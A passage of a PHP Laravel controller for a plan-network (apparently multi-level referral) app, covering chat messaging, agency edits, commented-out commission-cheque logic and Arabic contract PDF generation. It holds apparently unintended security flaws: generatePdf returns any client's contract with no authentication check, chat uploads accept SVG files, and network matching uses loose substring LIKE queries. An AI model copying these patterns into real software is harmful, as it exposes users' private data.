        $PlanProductPrice = $PlanNetwork->PlanProductPrice;
        if ($PlanNetwork->IDPlanProductUpgrade) {
            $PlanProductUpgrade = PlanProductUpgrade::find($PlanNetwork->IDPlanProductUpgrade);
            $PlanProductPrice = $PlanNetwork->PlanProductPrice + $PlanProductUpgrade->UpgradePrice;
        }

        $ActivateDate = new DateTime("now");
        $PlanNetworkExpireDate = $PlanNetwork->PlanNetworkExpireDate;
        $PlanNetworkExpireDate = new DateTime($PlanNetworkExpireDate);
        $Interval = $ActivateDate->diff($PlanNetworkExpireDate);
        $Days = $Interval->format('%a'); //now do whatever you like with $days

        $Product->PlanProductName = $Product->$PlanProductName;
        $Product->ActivateDate = $PlanNetwork->created_at;
        $Product->ExpireDate = $PlanNetwork->PlanNetworkExpireDate;
        $Product->RemainingDays = $Days;
        $Product->PlanProductGallery = $PlanProductGallery;
        $Product->PlanProductPrice = $PlanProductPrice;
        $Product->AgencyNumber = $PlanNetwork->PlanNetworkAgencyNumber;
        unset($Product["PlanProductNameEn"]);
        unset($Product["PlanProductNameAr"]);
        unset($Product["PlanProductDescEn"]);
        unset($Product["PlanProductDescAr"]);
        unset($Product["PlanProductAddressEn"]);
        unset($Product["PlanProductAddressAr"]);
        unset($Product["PlanProductPhone"]);
        unset($Product["PlanProductReferralPoints"]);
        unset($Product["PlanProductUplinePoints"]);
        unset($Product["PlanProductLatitude"]);
        unset($Product["PlanProductLongitude"]);
        unset($Product["PlanProductStatus"]);
        unset($Product["created_at"]);
        unset($Product["updated_at"]);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Product
        );
        return $Response;
    }

    public function PlanNetworkAgencies()
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $PlanNetwork = PlanNetwork::where("plannetwork.IDClient", $Client->IDClient)->first();
        if (!$PlanNetwork) {
            return RespondWithBadRequest(1);
        }

        $PlanNetworkAgencies = PlanNetworkAgency::where("IDPlanNetwork", $PlanNetwork->IDPlanNetwork)->get();

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $PlanNetworkAgencies
        );
        return $Response;
    }

    public function PlanNetworkAgencyEdit(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $IDPlanNetworkAgency = $request->IDPlanNetworkAgency;
        $PlanNetworkAgencyName = $request->PlanNetworkAgencyName;

        $PlanNetwork = PlanNetwork::where("plannetwork.IDClient", $Client->IDClient)->first();
        if (!$PlanNetwork) {
            return RespondWithBadRequest(1);
        }

        $PlanNetworkAgency = PlanNetworkAgency::where("IDPlanNetwork", $PlanNetwork->IDPlanNetwork)->where("IDPlanNetworkAgency", $IDPlanNetworkAgency)->first();
        if (!$PlanNetworkAgency) {
            return RespondWithBadRequest(1);
        }

        $PlanNetworkAgency->PlanNetworkAgencyName = $PlanNetworkAgencyName;
        $PlanNetworkAgency->save();

        return RespondWithSuccessRequest(8);
    }

    public function ClientChatList(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $IDPage = $request->IDPage;
        if (!$IDPage) {
            $IDPage = 0;
        } else {
            $IDPage = ($request->IDPage - 1) * 20;
        }

        $ClientChat = ClientChat::leftjoin("clients", "clients.IDClient", "clientchat.IDClient")->leftjoin("clients as c1", "c1.IDClient", "clientchat.IDFriend")->where("clientchat.IDClient", $Client->IDClient)->orwhere("clientchat.IDFriend", $Client->IDClient);
        $ClientChat = $ClientChat->select("clientchat.IDClientChat", "clientchat.IDClient", "clientchat.IDFriend", "clientchat.created_at", "clientchat.updated_at", "clients.ClientName", "clients.ClientPicture", "clients.ClientPrivacy", "c1.ClientName as FriendName", "c1.ClientPicture as FriendPicture", "c1.ClientPrivacy as FriendPrivacy")->orderby("clientchat.updated_at", "DESC");
        $Pages = ceil($ClientChat->count() / 20);
        $ClientChat = $ClientChat->skip($IDPage)->take(20)->get();

        $ClientChat = ClientChatResource::collection($ClientChat);
        $Response = array("ClientChat" => $ClientChat, "Pages" => $Pages);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Response
        );
        return $Response;
    }
    public function ClientAdminChat(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $IDPage = $request->IDPage;
        if (!$IDPage) {
            $IDPage = 0;
        } else {
            $IDPage = ($request->IDPage - 1) * 20;
        }

        $ClientAdminChat = ClientAdminChat::where("IDClient", $Client->IDClient);

        $APICode = APICode::where('IDAPICode', 8)->first();
        if ($ClientAdminChat->count() == 0) {
            return $Response = array(
                'Success' => true,
                'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
                'ApiCode' => $APICode->IDApiCode,
                'Response' => []
            );
        }

        $ClientAdminChat = $ClientAdminChat->select("IDClientAdminChat", "IDClient",  "created_at", "updated_at")->first();

        $ClientAdminChat = ClientAdminChatResource::make($ClientAdminChat);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $ClientAdminChat
        );
        return $Response;
    }

    public function ClientChatDetails(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $IDClient = $Client->IDClient;
        $IDClientChat = $request->IDClientChat;
        $IDFriend = $request->IDFriend;
        $IDPage = $request->IDPage;
        if (!$IDPage) {
            $IDPage = 0;
        } else {
            $IDPage = ($request->IDPage - 1) * 20;
        }

        if (!$IDClientChat && !$IDFriend) {
            return RespondWithBadRequest(1);
        }

        if ($IDClientChat) {
            $ClientChat = ClientChat::find($IDClientChat);
            if (!$IDClientChat) {
                return RespondWithBadRequest(1);
            }
        }
        if ($IDFriend) {
            $ClientChat = ClientChat::where(function ($query) use ($IDClient, $IDFriend) {
                $query->where('IDClient', $IDClient)
                    ->where('IDFriend', $IDFriend)
                    ->orwhere('IDClient', $IDFriend)
                    ->where('IDFriend', $IDClient);
            })->first();

            if (!$ClientChat) {
                $ClientChat = new ClientChat;
                $ClientChat->IDClient = $Client->IDClient;
                $ClientChat->IDFriend = $IDFriend;
                $ClientChat->save();
            }
            $IDClientChat = $ClientChat->IDClientChat;
        }

        if ($ClientChat->IDClient != $Client->IDClient && $ClientChat->IDFriend != $Client->IDClient) {
            return RespondWithBadRequest(1);
        }

        $IDFriend = $ClientChat->IDFriend;
        if ($ClientChat->IDFriend == $Client->IDClient) {
            $IDFriend = $ClientChat->IDClient;
        }

        ClientChatDetail::where("IDSender", $IDFriend)->where("MessageStatus", "SENT")->update(["MessageStatus" => "READ"]);

        $ClientChatDetails = ClientChatDetail::leftjoin("clients", "clients.IDClient", "clientchatdetails.IDSender")->where("clientchatdetails.IDClientChat", $IDClientChat);
        $ClientChatDetails = $ClientChatDetails->select("clientchatdetails.IDClientChatDetails", "clientchatdetails.IDSender", "clientchatdetails.Message", "clientchatdetails.MessageType", "clientchatdetails.MessageStatus", "clientchatdetails.created_at", "clientchatdetails.updated_at", "clients.ClientName", "clients.ClientPicture", "clients.ClientPrivacy")->orderby("clientchatdetails.IDClientChatDetails", "DESC");
        $Pages = ceil($ClientChatDetails->count() / 20);
        $ClientChatDetails = $ClientChatDetails->skip($IDPage)->take(20)->get();

        $ClientChatDetails = ClientChatDetailResource::collection($ClientChatDetails);
        if (!$IDClientChat) {
            $IDClientChat = "";
        }
        $Response = array("IDClientChat" => $IDClientChat, "ClientChatDetails" => $ClientChatDetails, "Pages" => $Pages);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Response
        );
        return $Response;
    }
    public function ClientAdminChatDetails(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $IDClient = $Client->IDClient;
        $ClientAdminChat = ClientAdminChat::where("IDClient", $IDClient)->first();
        if (!$ClientAdminChat) {
            return RespondWithBadRequest(1);
        }
        $IDClientAdminChat = $ClientAdminChat->IDClientAdminChat;

        $IDPage = $request->IDPage;
        if (!$IDPage) {
            $IDPage = 0;
        } else {
            $IDPage = ($request->IDPage - 1) * 20;
        }

        if (!$IDClientAdminChat) {
            return RespondWithBadRequest(1);
        }

        if ($IDClientAdminChat) {
            $ClientAdminChat = ClientAdminChat::find($IDClientAdminChat);
            if (!$ClientAdminChat) {
                return RespondWithBadRequest(1);
            }
        }
        if ($ClientAdminChat->IDClient != $Client->IDClient) {
            return RespondWithBadRequest(1);
        }

        $ClientAdminChatDetails = ClientAdminChatDetails::where("IDClientAdminChat", $IDClientAdminChat);
        $ClientAdminChatDetails = $ClientAdminChatDetails->select("IDClientAdminChatDetails", "Message", "MessageType", "MessageStatus", "created_at", "updated_at",)->orderby("IDClientAdminChatDetails", "DESC");
        $Pages = ceil($ClientAdminChatDetails->count() / 20);
        $ClientAdminChatDetails = $ClientAdminChatDetails->skip($IDPage)->take(20)->get();

        $ClientAdminChatDetails = ClientAdminChatDetailsResource::collection($ClientAdminChatDetails);

        $Response = array("IDClientAdminChat" => $IDClientAdminChat, "ClientAdminChatDetails" => $ClientAdminChatDetails, "Pages" => $Pages);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Response
        );
        return $Response;
    }

    public function ClientChatSend(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }
        $IDFriend = $request->IDFriend;
        if (!$IDFriend) {
            return RespondWithBadRequest(1);
        }

        if ($IDFriend) {
            $ClientChat = ClientChat::where("IDClient", $Client->IDClient)->where("IDFriend", $IDFriend)->first();
            if (!$ClientChat) {
                $ClientChat = ClientChat::where("IDFriend", $Client->IDClient)->where("IDClient", $IDFriend)->first();
            }

            if (!$ClientChat) {

                $ClientChat = new ClientChat;
                $ClientChat->IDClient = $Client->IDClient;
                $ClientChat->IDFriend = $IDFriend;
                $ClientChat->save();
            }
            $IDClientChat = $ClientChat->IDClientChat;
        }


        $Message = $request->Message;
        $MessageType = $request->MessageType;
        if (!$Message) {
            return RespondWithBadRequest(1);
        }
        if (!$MessageType) {
            return RespondWithBadRequest(1);
        }

        if ($MessageType == "IMAGE") {
            $ImageExtArray = ["jpeg", "jpg", "png", "svg"];
        }

        if ($MessageType == "AUDIO") {
            $ImageExtArray = ["mp3", "mp4", "m4a"];
        }

        if ($MessageType != "TEXT") {
            if ($request->file('Message')) {
                if (!in_array($request->Message->extension(), $ImageExtArray)) {
                    return RespondWithBadRequest(15);
                }
                $File = SaveImage($request->file('Message'), "chat", $IDClientChat);
                $Message = $File;
            } else {
                return RespondWithBadRequest(1);
            }
        }

        $ClientChatDetail = new ClientChatDetail;
        $ClientChatDetail->IDClientChat = $IDClientChat;
        $ClientChatDetail->IDSender = $Client->IDClient;
        $ClientChatDetail->Message = $Message;
        $ClientChatDetail->MessageType = $MessageType;
        $ClientChatDetail->save();

        $ClientChat->save();

        $Friend = Client::find($IDFriend);

        switch ($ClientChatDetail->MessageType) {
            case 'TEXT':
                sendFirebaseNotification($Friend, $ClientChatDetail, "$Client->ClientName: ", $Message);
                break;
            case "IMAGE":
                sendFirebaseNotification($Friend, [], "$Client->ClientName ", "send an image");
                break;
            case "AUDIO":
                sendFirebaseNotification($Friend, [], "$Client->ClientName ", 'send an audio');
                break;
        }
        return RespondWithSuccessRequest(8);
    }
    public function ClientChatAllSend(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }
        $ClientsInNetwork = PlanNetwork::where("PlanNetworkPath", "LIKE", "%$Client->IDClient%")->select("IDClient")->get();
        foreach ($ClientsInNetwork as $ClientInNetwork) {
            $ClientChat = ClientChat::Where("IDClient", $Client->IDClient)->where("IDFriend", $ClientInNetwork->IDClient)->first();

            if (!$ClientChat) {
                $ClientChat = new ClientChat;
                $ClientChat->IDClient = $Client->IDClient;
                $ClientChat->IDFriend = $ClientInNetwork->IDClient;
                $ClientChat->save();
            }
            $IDClientChat = $ClientChat->IDClientChat;

            $Message = $request->Message;
            $MessageType = $request->MessageType;
            if (!$Message) {
                return RespondWithBadRequest(1);
            }
            if (!$MessageType) {
                return RespondWithBadRequest(1);
            }

            if ($MessageType == "IMAGE") {
                $ImageExtArray = ["jpeg", "jpg", "png", "svg"];
            }

            if ($MessageType == "AUDIO") {
                $ImageExtArray = ["mp3", "mp4", "m4a"];
            }

            if ($MessageType != "TEXT") {
                if ($request->file('Message')) {
                    if (!in_array($request->Message->extension(), $ImageExtArray)) {
                        return RespondWithBadRequest(15);
                    }
                    $File = SaveImage($request->file('Message'), "chat", $IDClientChat);
                    $Message = $File;
                } else {
                    return RespondWithBadRequest(1);
                }
            }

            $ClientChatDetail = new ClientChatDetail;
            $ClientChatDetail->IDClientChat = $IDClientChat;
            $ClientChatDetail->IDSender = $Client->IDClient;
            $ClientChatDetail->Message = $Message;
            $ClientChatDetail->MessageType = $MessageType;
            $ClientChatDetail->save();

            $Receiver = Client::find($ClientInNetwork->IDClient);
            switch ($ClientChatDetail->MessageType) {
                case 'TEXT':
                    sendFirebaseNotification($Receiver, $ClientChatDetail, "$Client->ClientName: ", $Message);
                    break;
                case "IMAGE":
                    sendFirebaseNotification($Receiver, [], "$Client->ClientName ", "send an image");
                    break;
                case "AUDIO":
                    sendFirebaseNotification($Receiver, [], "$Client->ClientName ", 'send an audio');
                    break;
            }
        }

        return RespondWithSuccessRequest(8);
    }

    public function Test(Request $request)
    {
        // $Client = Client::find(343);

        // $ParentPlanNetwork = PlanNetwork::where("PlanNetworkPath", "LIKE", "%$Client->IDClient%")->get();
        // $PlanNetworkPath = $ParentPlanNetwork->PlanNetworkPath;
        // $PlanNetworkPath = explode("-", $PlanNetworkPath);

        // return $PlanNetworkPath;
        // $CurrentTime = new DateTime('now');
        // $Day = strtoupper($CurrentTime->format('l'));

        // $Plans = Plan::where("PlanStatus", "ACTIVE")->where('ChequeEarnDay', 'like', '%' . $Day . '%')->get();
        // foreach ($Plans as $Plan) {
        //     $LeftBalanceNumber = $Plan->LeftBalanceNumber;
        //     $RightBalanceNumber = $Plan->RightBalanceNumber;
        //     $LeftMaxOutNumber = $Plan->LeftMaxOutNumber;
        //     $RightMaxOutNumber = $Plan->RightMaxOutNumber;
        //     $PlanChequeValue = $Plan->ChequeValue;
        //     $ChequeMaxOut = $Plan->ChequeMaxOut;

        //     $PlanNetwork = PlanNetwork::where("IDPlan", $Plan->IDPlan)->get();
        //     foreach ($PlanNetwork as $Person) {
        //         $IDClient = $Person->IDClient;
        //         $AgencyNumber = $Person->PlanNetworkAgencyNumber;
        //         $Counter = 1;
        //         while ($Counter <= $AgencyNumber) {
        //             $LeftNetworkNumber = 0;
        //             $RightNetworkNumber = 0;
        //             $ChequeValue = 0;

        //             $PreviousNetworkClients = PlanNetworkChequeDetail::where("IDClient", $IDClient)->pluck("IDClientNetwork")->toArray();
        //             $LeftNetwork = PlanNetwork::where("IDParentClient", $IDClient)->where("PlanNetworkAgency", $Counter)->where("PlanNetworkPosition", "LEFT")->first();
        //             $RightNetwork = PlanNetwork::where("IDParentClient", $IDClient)->where("PlanNetworkAgency", $Counter)->where("PlanNetworkPosition", "RIGHT")->first();

        //             if ($LeftNetwork) {
        //                 $IDClient = $LeftNetwork->IDClient;
        //                 $Key = $IDClient . "-";
        //                 $SecondKey = $IDClient . "-";
        //                 $ThirdKey = "-" . $IDClient;
        //                 $AllNetwork = PlanNetwork::leftjoin("clients", "clients.IDClient", "plannetwork.IDClient")->leftjoin("clients as C1", "C1.IDClient", "plannetwork.IDReferralClient")->where("plannetwork.PlanNetworkAgency", $Counter)->whereNotIn("plannetwork.IDClient", $PreviousNetworkClients);
        //                 $AllNetwork = $AllNetwork->where(function ($query) use ($IDClient, $Key, $SecondKey, $ThirdKey) {
        //                     $query->where("plannetwork.PlanNetworkPath", 'like', $IDClient . '%')
        //                         ->orwhere("plannetwork.PlanNetworkPath", $IDClient)
        //                         ->orwhere("plannetwork.PlanNetworkPath", 'like', $Key . '%')
        //                         ->orwhere("plannetwork.PlanNetworkPath", 'like', '%' . $SecondKey . '%')
        //                         ->orwhere("plannetwork.PlanNetworkPath", 'like', '%' . $ThirdKey . '%');
        //                 });

        //                 $LeftNetworkNumber = $AllNetwork->count();
        //                 $LeftNetwork = $AllNetwork->select("plannetwork.IDClient")->get()->pluck("IDClient")->toArray();
        //                 if (!in_array($IDClient, $PreviousNetworkClients)) {
        //                     array_push($LeftNetwork, $IDClient);
        //                     $LeftNetworkNumber++;
        //                 }
        //             }

        //             if ($RightNetwork) {
        //                 $IDClient = $RightNetwork->IDClient;
        //                 $Key = $IDClient . "-";
        //                 $SecondKey = $IDClient . "-";
        //                 $ThirdKey = "-" . $IDClient;
        //                 $AllNetwork = PlanNetwork::leftjoin("clients", "clients.IDClient", "plannetwork.IDClient")->leftjoin("clients as C1", "C1.IDClient", "plannetwork.IDReferralClient")->where("plannetwork.PlanNetworkAgency", $Counter)->whereNotIn("plannetwork.IDClient", $PreviousNetworkClients);
        //                 $AllNetwork = $AllNetwork->where(function ($query) use ($IDClient, $Key, $SecondKey, $ThirdKey) {
        //                     $query->where("plannetwork.PlanNetworkPath", 'like', $IDClient . '%')
        //                         ->orwhere("plannetwork.PlanNetworkPath", $IDClient)
        //                         ->orwhere("plannetwork.PlanNetworkPath", 'like', $Key . '%')
        //                         ->orwhere("plannetwork.PlanNetworkPath", 'like', '%' . $SecondKey . '%')
        //                         ->orwhere("plannetwork.PlanNetworkPath", 'like', '%' . $ThirdKey . '%');
        //                 });

        //                 $RightNetworkNumber = $AllNetwork->count();
        //                 $RightNetwork = $AllNetwork->select("plannetwork.IDClient")->get()->pluck("IDClient")->toArray();
        //                 if (!in_array($IDClient, $PreviousNetworkClients)) {
        //                     array_push($RightNetwork, $IDClient);
        //                     $RightNetworkNumber++;
        //                 }
        //             }

        //             if ($LeftNetworkNumber > $LeftMaxOutNumber) {
        //                 $LeftNetworkNumber = $LeftMaxOutNumber;
        //             }
        //             if ($RightNetworkNumber > $RightMaxOutNumber) {
        //                 $RightNetworkNumber = $RightMaxOutNumber;
        //             }

        //             if ($LeftBalanceNumber <= $LeftNetworkNumber && $RightBalanceNumber <= $RightNetworkNumber) {

        //                 $LeftNumber = intdiv($LeftNetworkNumber, $LeftBalanceNumber);
        //                 $RightNumber = intdiv($RightNetworkNumber, $RightBalanceNumber);
        //                 if ($LeftNumber <= $RightNumber) {
        //                     $Number = $LeftNumber;
        //                 }
        //                 if ($RightNumber <= $LeftNumber) {
        //                     $Number = $RightNumber;
        //                 }
        //                 $ChequeValue = $Number * $PlanChequeValue;

        //                 $LeftNumber = $Number * $LeftBalanceNumber;
        //                 $RightNumber = $Number * $RightBalanceNumber;
        //                 if ($LeftNumber <= $RightNumber) {
        //                     $Number = $LeftNumber;
        //                 }
        //                 if ($RightNumber <= $LeftNumber) {
        //                     $Number = $RightNumber;
        //                 }
        //                 $IDClient = $Person->IDClient;
        //                 $Client = Client::find($IDClient);

        //                 $PlanNetworkCheque = new PlanNetworkCheque;
        //                 $PlanNetworkCheque->IDPlanNetwork = $Person->IDPlanNetwork;
        //                 $PlanNetworkCheque->ChequeLeftNumber = $Number;
        //                 $PlanNetworkCheque->ChequeRightNumber = $Number;
        //                 $PlanNetworkCheque->ChequeLeftReachedNumber = $LeftNetworkNumber;
        //                 $PlanNetworkCheque->ChequeRightReachedNumber = $RightNetworkNumber;
        //                 $PlanNetworkCheque->ChequeValue = $ChequeValue;
        //                 $PlanNetworkCheque->AgencyNumber = $Counter;
        //                 $PlanNetworkCheque->save();

        //                 $CompanyLedger = new CompanyLedger;
        //                 $CompanyLedger->IDSubCategory = 19;
        //                 $CompanyLedger->CompanyLedgerAmount = $ChequeValue;
        //                 $CompanyLedger->CompanyLedgerDesc = "Cheque Payment to Client " . $Client->ClientName;
        //                 $CompanyLedger->CompanyLedgerProcess = "AUTO";
        //                 $CompanyLedger->CompanyLedgerType = "DEBIT";
        //                 $CompanyLedger->save();


        //                 $IDPlanNetworkCheque = $PlanNetworkCheque->IDPlanNetworkCheque;

        //                 for ($I = 0; $I < $Number; $I++) {
        //                     $PlanNetworkChequeDetail = new PlanNetworkChequeDetail;
        //                     $PlanNetworkChequeDetail->IDPlanNetworkCheque = $IDPlanNetworkCheque;
        //                     $PlanNetworkChequeDetail->IDClient = $IDClient;
        //                     $PlanNetworkChequeDetail->IDClientNetwork = $LeftNetwork[$I];
        //                     $PlanNetworkChequeDetail->save();

        //                     $PlanNetworkChequeDetail = new PlanNetworkChequeDetail;
        //                     $PlanNetworkChequeDetail->IDPlanNetworkCheque = $IDPlanNetworkCheque;
        //                     $PlanNetworkChequeDetail->IDClient = $IDClient;
        //                     $PlanNetworkChequeDetail->IDClientNetwork = $RightNetwork[$I];
        //                     $PlanNetworkChequeDetail->save();
        //                 }
        //             }

        //             $Counter++;
        //         }
        //     }
        // }
    }
    public function generatePdf($Client_id)
    {
        $Client = Client::where("IDClient", $Client_id)->first();
        $date = $Client->created_at;

        $carbonDate = Carbon::parse($date);
        $carbonDate->locale('ar'); // Set locale to Arabic
        $day = $carbonDate->translatedFormat('l'); // 'l' stands for the full textual representation of the day

        $data = [
            'client' => $Client,
            'date' => $carbonDate->format('Y-m-d'), // Format date as string
            'day' => $day,
        ];

        $mpdfConfig = array(
            'mode' => 'utf-8',
            'format' => 'A4',
            'orientation' => 'p',
            'margin_header' => 2, // 30mm not pixel
            'margin_footer' => 2, // 10mm
        );
        $pdf = new Mpdf($mpdfConfig);
        $pdf->SetXY(100, 80);
        $pdf->SetAutoPageBreak(true, 10);
        $pdf->SetHTMLFooter('الصفحة: {PAGENO} ');
        $pdf->autoScriptToLang = true;
        $pdf->autoLangToFont = true;
        $pdf->AddPage();
        $pdf->SetDirectionality('rtl');
        // $pdf->SetColumns(2, 'J', 3);
        $filename = 'contract' . $Client_id . '.pdf';

        $html = view('pdf.download_contract', $data)->render();
        $pdf->writeHTML($html);
        $pdfContent = $pdf->Output('', 'S'); // 'S' for returning the PDF as a string
        // Return the PDF content as a response with appropriate headers
        return response($pdfContent)
            ->header('Content-Type', 'application/pdf')
            ->header('Content-Disposition', 'inline; filename="' . $filename . '"');
    }
}
